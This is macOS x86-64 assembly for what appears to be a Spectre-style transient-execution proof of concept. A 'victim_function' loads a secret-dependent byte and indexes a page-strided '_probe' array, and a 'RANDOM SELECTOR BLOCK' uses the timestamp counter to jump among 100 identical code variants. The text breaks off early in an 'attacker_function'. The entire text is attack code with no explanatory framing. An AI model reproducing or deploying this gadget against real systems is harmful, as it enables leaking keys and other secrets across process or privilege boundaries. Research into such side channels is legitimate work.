	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 15, 0	sdk_version 26, 1
	.globl	_victim_function                ## -- Begin function victim_function
	.p2align	4, 0x90
_victim_function:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -8(%rbp)
	movq	_memory_slot_ptr@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	leaq	_public_key(%rip), %rcx
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lvictim_function_win0_var0
	cmpl	$1, %eax
	je	.Lvictim_function_win0_var1
	cmpl	$2, %eax
	je	.Lvictim_function_win0_var2
	cmpl	$3, %eax
	je	.Lvictim_function_win0_var3
	cmpl	$4, %eax
	je	.Lvictim_function_win0_var4
	cmpl	$5, %eax
	je	.Lvictim_function_win0_var5
	cmpl	$6, %eax
	je	.Lvictim_function_win0_var6
	cmpl	$7, %eax
	je	.Lvictim_function_win0_var7
	cmpl	$8, %eax
	je	.Lvictim_function_win0_var8
	cmpl	$9, %eax
	je	.Lvictim_function_win0_var9
	cmpl	$10, %eax
	je	.Lvictim_function_win0_var10
	cmpl	$11, %eax
	je	.Lvictim_function_win0_var11
	cmpl	$12, %eax
	je	.Lvictim_function_win0_var12
	cmpl	$13, %eax
	je	.Lvictim_function_win0_var13
	cmpl	$14, %eax
	je	.Lvictim_function_win0_var14
	cmpl	$15, %eax
	je	.Lvictim_function_win0_var15
	cmpl	$16, %eax
	je	.Lvictim_function_win0_var16
	cmpl	$17, %eax
	je	.Lvictim_function_win0_var17
	cmpl	$18, %eax
	je	.Lvictim_function_win0_var18
	cmpl	$19, %eax
	je	.Lvictim_function_win0_var19
	cmpl	$20, %eax
	je	.Lvictim_function_win0_var20
	cmpl	$21, %eax
	je	.Lvictim_function_win0_var21
	cmpl	$22, %eax
	je	.Lvictim_function_win0_var22
	cmpl	$23, %eax
	je	.Lvictim_function_win0_var23
	cmpl	$24, %eax
	je	.Lvictim_function_win0_var24
	cmpl	$25, %eax
	je	.Lvictim_function_win0_var25
	cmpl	$26, %eax
	je	.Lvictim_function_win0_var26
	cmpl	$27, %eax
	je	.Lvictim_function_win0_var27
	cmpl	$28, %eax
	je	.Lvictim_function_win0_var28
	cmpl	$29, %eax
	je	.Lvictim_function_win0_var29
	cmpl	$30, %eax
	je	.Lvictim_function_win0_var30
	cmpl	$31, %eax
	je	.Lvictim_function_win0_var31
	cmpl	$32, %eax
	je	.Lvictim_function_win0_var32
	cmpl	$33, %eax
	je	.Lvictim_function_win0_var33
	cmpl	$34, %eax
	je	.Lvictim_function_win0_var34
	cmpl	$35, %eax
	je	.Lvictim_function_win0_var35
	cmpl	$36, %eax
	je	.Lvictim_function_win0_var36
	cmpl	$37, %eax
	je	.Lvictim_function_win0_var37
	cmpl	$38, %eax
	je	.Lvictim_function_win0_var38
	cmpl	$39, %eax
	je	.Lvictim_function_win0_var39
	cmpl	$40, %eax
	je	.Lvictim_function_win0_var40
	cmpl	$41, %eax
	je	.Lvictim_function_win0_var41
	cmpl	$42, %eax
	je	.Lvictim_function_win0_var42
	cmpl	$43, %eax
	je	.Lvictim_function_win0_var43
	cmpl	$44, %eax
	je	.Lvictim_function_win0_var44
	cmpl	$45, %eax
	je	.Lvictim_function_win0_var45
	cmpl	$46, %eax
	je	.Lvictim_function_win0_var46
	cmpl	$47, %eax
	je	.Lvictim_function_win0_var47
	cmpl	$48, %eax
	je	.Lvictim_function_win0_var48
	cmpl	$49, %eax
	je	.Lvictim_function_win0_var49
	cmpl	$50, %eax
	je	.Lvictim_function_win0_var50
	cmpl	$51, %eax
	je	.Lvictim_function_win0_var51
	cmpl	$52, %eax
	je	.Lvictim_function_win0_var52
	cmpl	$53, %eax
	je	.Lvictim_function_win0_var53
	cmpl	$54, %eax
	je	.Lvictim_function_win0_var54
	cmpl	$55, %eax
	je	.Lvictim_function_win0_var55
	cmpl	$56, %eax
	je	.Lvictim_function_win0_var56
	cmpl	$57, %eax
	je	.Lvictim_function_win0_var57
	cmpl	$58, %eax
	je	.Lvictim_function_win0_var58
	cmpl	$59, %eax
	je	.Lvictim_function_win0_var59
	cmpl	$60, %eax
	je	.Lvictim_function_win0_var60
	cmpl	$61, %eax
	je	.Lvictim_function_win0_var61
	cmpl	$62, %eax
	je	.Lvictim_function_win0_var62
	cmpl	$63, %eax
	je	.Lvictim_function_win0_var63
	cmpl	$64, %eax
	je	.Lvictim_function_win0_var64
	cmpl	$65, %eax
	je	.Lvictim_function_win0_var65
	cmpl	$66, %eax
	je	.Lvictim_function_win0_var66
	cmpl	$67, %eax
	je	.Lvictim_function_win0_var67
	cmpl	$68, %eax
	je	.Lvictim_function_win0_var68
	cmpl	$69, %eax
	je	.Lvictim_function_win0_var69
	cmpl	$70, %eax
	je	.Lvictim_function_win0_var70
	cmpl	$71, %eax
	je	.Lvictim_function_win0_var71
	cmpl	$72, %eax
	je	.Lvictim_function_win0_var72
	cmpl	$73, %eax
	je	.Lvictim_function_win0_var73
	cmpl	$74, %eax
	je	.Lvictim_function_win0_var74
	cmpl	$75, %eax
	je	.Lvictim_function_win0_var75
	cmpl	$76, %eax
	je	.Lvictim_function_win0_var76
	cmpl	$77, %eax
	je	.Lvictim_function_win0_var77
	cmpl	$78, %eax
	je	.Lvictim_function_win0_var78
	cmpl	$79, %eax
	je	.Lvictim_function_win0_var79
	cmpl	$80, %eax
	je	.Lvictim_function_win0_var80
	cmpl	$81, %eax
	je	.Lvictim_function_win0_var81
	cmpl	$82, %eax
	je	.Lvictim_function_win0_var82
	cmpl	$83, %eax
	je	.Lvictim_function_win0_var83
	cmpl	$84, %eax
	je	.Lvictim_function_win0_var84
	cmpl	$85, %eax
	je	.Lvictim_function_win0_var85
	cmpl	$86, %eax
	je	.Lvictim_function_win0_var86
	cmpl	$87, %eax
	je	.Lvictim_function_win0_var87
	cmpl	$88, %eax
	je	.Lvictim_function_win0_var88
	cmpl	$89, %eax
	je	.Lvictim_function_win0_var89
	cmpl	$90, %eax
	je	.Lvictim_function_win0_var90
	cmpl	$91, %eax
	je	.Lvictim_function_win0_var91
	cmpl	$92, %eax
	je	.Lvictim_function_win0_var92
	cmpl	$93, %eax
	je	.Lvictim_function_win0_var93
	cmpl	$94, %eax
	je	.Lvictim_function_win0_var94
	cmpl	$95, %eax
	je	.Lvictim_function_win0_var95
	cmpl	$96, %eax
	je	.Lvictim_function_win0_var96
	cmpl	$97, %eax
	je	.Lvictim_function_win0_var97
	cmpl	$98, %eax
	je	.Lvictim_function_win0_var98
	cmpl	$99, %eax
	je	.Lvictim_function_win0_var99
	jmp	.Lvictim_function_win0_var0
## Variant 0
.Lvictim_function_win0_var0:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1
.Lvictim_function_win0_var1:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2
.Lvictim_function_win0_var2:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 3
.Lvictim_function_win0_var3:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 4
.Lvictim_function_win0_var4:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 5
.Lvictim_function_win0_var5:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 6
.Lvictim_function_win0_var6:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 7
.Lvictim_function_win0_var7:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 8
.Lvictim_function_win0_var8:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 9
.Lvictim_function_win0_var9:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 10
.Lvictim_function_win0_var10:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 11
.Lvictim_function_win0_var11:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 12
.Lvictim_function_win0_var12:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 13
.Lvictim_function_win0_var13:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 14
.Lvictim_function_win0_var14:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 15
.Lvictim_function_win0_var15:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 16
.Lvictim_function_win0_var16:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 17
.Lvictim_function_win0_var17:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 18
.Lvictim_function_win0_var18:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 19
.Lvictim_function_win0_var19:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 20
.Lvictim_function_win0_var20:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 21
.Lvictim_function_win0_var21:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 22
.Lvictim_function_win0_var22:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 23
.Lvictim_function_win0_var23:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 24
.Lvictim_function_win0_var24:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 25
.Lvictim_function_win0_var25:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 26
.Lvictim_function_win0_var26:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 27
.Lvictim_function_win0_var27:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 28
.Lvictim_function_win0_var28:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 29
.Lvictim_function_win0_var29:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 30
.Lvictim_function_win0_var30:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 31
.Lvictim_function_win0_var31:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 32
.Lvictim_function_win0_var32:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 33
.Lvictim_function_win0_var33:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 34
.Lvictim_function_win0_var34:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 35
.Lvictim_function_win0_var35:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 36
.Lvictim_function_win0_var36:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 37
.Lvictim_function_win0_var37:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 38
.Lvictim_function_win0_var38:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 39
.Lvictim_function_win0_var39:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 40
.Lvictim_function_win0_var40:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 41
.Lvictim_function_win0_var41:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 42
.Lvictim_function_win0_var42:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 43
.Lvictim_function_win0_var43:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 44
.Lvictim_function_win0_var44:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 45
.Lvictim_function_win0_var45:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 46
.Lvictim_function_win0_var46:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 47
.Lvictim_function_win0_var47:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 48
.Lvictim_function_win0_var48:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 49
.Lvictim_function_win0_var49:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 50
.Lvictim_function_win0_var50:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 51
.Lvictim_function_win0_var51:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 52
.Lvictim_function_win0_var52:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 53
.Lvictim_function_win0_var53:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 54
.Lvictim_function_win0_var54:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 55
.Lvictim_function_win0_var55:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 56
.Lvictim_function_win0_var56:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 57
.Lvictim_function_win0_var57:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 58
.Lvictim_function_win0_var58:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 59
.Lvictim_function_win0_var59:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 60
.Lvictim_function_win0_var60:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 61
.Lvictim_function_win0_var61:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 62
.Lvictim_function_win0_var62:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 63
.Lvictim_function_win0_var63:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 64
.Lvictim_function_win0_var64:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 65
.Lvictim_function_win0_var65:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 66
.Lvictim_function_win0_var66:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 67
.Lvictim_function_win0_var67:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 68
.Lvictim_function_win0_var68:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 69
.Lvictim_function_win0_var69:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 70
.Lvictim_function_win0_var70:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 71
.Lvictim_function_win0_var71:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 72
.Lvictim_function_win0_var72:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 73
.Lvictim_function_win0_var73:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 74
.Lvictim_function_win0_var74:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 75
.Lvictim_function_win0_var75:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 76
.Lvictim_function_win0_var76:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 77
.Lvictim_function_win0_var77:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 78
.Lvictim_function_win0_var78:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 79
.Lvictim_function_win0_var79:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 80
.Lvictim_function_win0_var80:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 81
.Lvictim_function_win0_var81:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 82
.Lvictim_function_win0_var82:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 83
.Lvictim_function_win0_var83:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 84
.Lvictim_function_win0_var84:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 85
.Lvictim_function_win0_var85:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 86
.Lvictim_function_win0_var86:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 87
.Lvictim_function_win0_var87:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 88
.Lvictim_function_win0_var88:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 89
.Lvictim_function_win0_var89:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 90
.Lvictim_function_win0_var90:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 91
.Lvictim_function_win0_var91:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 92
.Lvictim_function_win0_var92:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 93
.Lvictim_function_win0_var93:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 94
.Lvictim_function_win0_var94:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 95
.Lvictim_function_win0_var95:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 96
.Lvictim_function_win0_var96:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 97
.Lvictim_function_win0_var97:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 98
.Lvictim_function_win0_var98:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 99
.Lvictim_function_win0_var99:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
.Lvictim_function_win0_continue:
	addq	$32, %rsp
	movq	-8(%rbp), %rcx
	movzbl	(%rax,%rcx), %eax
	shll	$12, %eax
	movslq	%eax, %rcx
	movq	_probe@GOTPCREL(%rip), %rax
	movb	(%rax,%rcx), %al
	movb	%al, _tmp(%rip)
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.section	__TEXT,__literal8,8byte_literals
	.p2align	3, 0x0                          ## -- Begin function attacker_function
LCPI1_0:
	.quad	0x40c3880000000000              ## double 1.0E+4
LCPI1_1:
	.quad	0x4059000000000000              ## double 100
	.section	__TEXT,__text,regular,pure_instructions
	.globl	_attacker_function
	.p2align	4, 0x90
_attacker_function:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$1152, %rsp    # # imm = 0x480
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	leaq	-32(%rbp), %rdi
	xorl	%esi, %esi
	movl	$17, %edx
	callq	_memset
	movl	$0, -1076(%rbp)
LBB1_1:                                 ## =>This Loop Header: Depth=1
                                        ##     Child Loop BB1_3 Depth 2
                                        ##       Child Loop BB1_5 Depth 3
                                        ##       Child Loop BB1_9 Depth 3
                                        ##     Child Loop BB1_18 Depth 2
	cmpl	$16, -1076(%rbp)
	jge	LBB1_26
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-1056(%rbp), %rdi
	xorl	%esi, %esi
	movl	$1024, %edx    # # imm = 0x400
	callq	_memset
